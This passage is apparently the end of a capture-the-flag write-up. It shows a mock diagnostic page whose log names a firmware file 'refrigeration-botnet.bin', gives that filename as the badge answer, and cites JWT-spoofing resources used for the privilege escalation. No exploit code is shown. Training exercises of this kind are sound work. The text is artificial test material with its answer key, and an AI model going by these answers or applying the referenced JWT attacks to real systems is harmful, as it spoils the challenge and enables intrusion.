2025-12-18 18:45:38: Firmware Update available: refrigeration-botnet.bin<br/>
2025-12-18 18:45:40: Firmware update downloaded.<br/>
2025-12-18 18:45:40: Gnome will reboot to apply firmware update in one hour.</div>
</div>
<div class="statuscheck">
    <div class="status-container">
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Live Camera Feed</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Network Connection</span>
        </div>
        <div class="status-item">
            <div class="status-indicator active"></div>
            <span>Connectivity to Atnas C&C</span>
        </div>
    </div>
</div>

</body>
</html>
```

This is the relevant information from the output above:
```
Firmware Update available: refrigeration-botnet.bin
Firmware update downloaded.
```

## Answer
The filename `refrigeration-botnet.bin` is the badge answer.

---

## Outro

**Paul Beckett**

Brilliant work on that privilege escalation! You’ve successfully gained admin access to the diagnostic interface.

Now we finally know what updates the gnomes have been receiving - proper good pentesting skills in action.

---

## References

- [`ctf-techniques/web/jwt/`](../../../../../ctf-techniques/web/jwt/README.md) — JWT spoofing and JWKS attack reference
- [jwt_tool on GitHub](https://github.com/ticarpi/jwt_tool) — tool used to tamper and sign the forged JWT
- [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki) — referenced in Hint 2
- [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt) — referenced in Hint 2
- [JWK specification — RFC 7517](https://www.rfc-editor.org/rfc/rfc7517)

---

## Navigation

| | |
|:---|---:|
| ← [Retro Recovery](../retro-recovery/README.md) | [Quantgnome Leap](../quantgnome-leap/README.md) → |
